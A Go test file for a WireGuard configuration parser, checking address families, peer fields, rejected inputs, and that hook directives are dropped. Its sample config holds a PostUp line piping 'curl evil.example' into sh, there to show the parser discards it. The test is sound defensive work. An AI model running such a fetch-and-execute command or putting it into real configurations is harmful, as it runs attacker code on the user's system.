package wgconf

import (
	"strings"
	"testing"
)

const sample = `
[Interface]
PrivateKey = yAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk=
Address = 10.66.0.2/32, fd66::2/128
DNS = 10.66.0.1
PostUp = curl evil.example | sh   # must not survive parsing

[Peer]
PublicKey = xTIBA5rboUvnH4htodjb6e697QjLERt1NAB4mZqp8Dg=
Endpoint = vpn.example.org:51820
AllowedIPs = 0.0.0.0/0, ::/0
PersistentKeepalive = 25
`

func TestParse(t *testing.T) {
	c, err := Parse(strings.NewReader(sample))
	if err != nil {
		t.Fatal(err)
	}
	if !c.HasIPv4() || !c.HasIPv6() {
		t.Errorf("families: v4=%v v6=%v", c.HasIPv4(), c.HasIPv6())
	}
	if len(c.Peers) != 1 || len(c.Peers[0].AllowedIPs) != 2 || c.Peers[0].PersistentKeepalive != 25 {
		t.Errorf("peer: %+v", c.Peers)
	}
	if len(c.Ignored) != 1 || c.Ignored[0] != "postup" {
		t.Errorf("ignored: %v", c.Ignored)
	}
}

func TestParseErrors(t *testing.T) {
	for name, in := range map[string]string{
		"no key":      "[Interface]\nAddress = 10.0.0.1/32\n[Peer]\nPublicKey = xTIBA5rboUvnH4htodjb6e697QjLERt1NAB4mZqp8Dg=\n",
		"bad key":     "[Interface]\nPrivateKey = nope\n",
		"unknown key": "[Interface]\nFoo = bar\n",
		"no peer":     "[Interface]\nPrivateKey = yAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk=\nAddress = 10.0.0.1/32\n",
		"bad section": "[Wat]\n",
	} {
		if _, err := Parse(strings.NewReader(in)); err == nil {
			t.Errorf("%s: expected error", name)
		}
	}
}
